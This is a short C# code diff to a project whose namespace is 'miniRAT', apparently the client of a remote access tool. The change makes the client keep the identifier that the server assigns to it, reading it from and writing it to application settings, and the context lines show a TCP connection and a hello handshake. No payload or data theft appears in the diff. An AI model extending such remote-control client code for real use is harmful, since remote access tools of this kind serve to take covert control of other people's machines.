@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Configuration;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -15,7 +16,7 @@ namespace miniRAT
     {
         //must be same in client and server
         const string separator = "|||";
-        static Guid clientID = Guid.Empty;
+        static Guid clientID = Guid.Parse(ConfigurationManager.AppSettings["GUIDKEY"] ?? Guid.Empty.ToString());
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
 
@@ -108,8 +109,8 @@ namespace miniRAT
                 string[] helloArray = helloResponse.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
                 if (helloArray.Length < 2)//error in hello response 
                     throw new Exception("Error in hello response");
-
                 clientID = Guid.Parse(helloArray[0].ToString());
+                ConfigurationManager.AppSettings.Set("GUIDKEY", clientID.ToString());
                 Console.WriteLine("Connected to server id= " + clientID.ToString());
             }
             catch  (Exception ex)
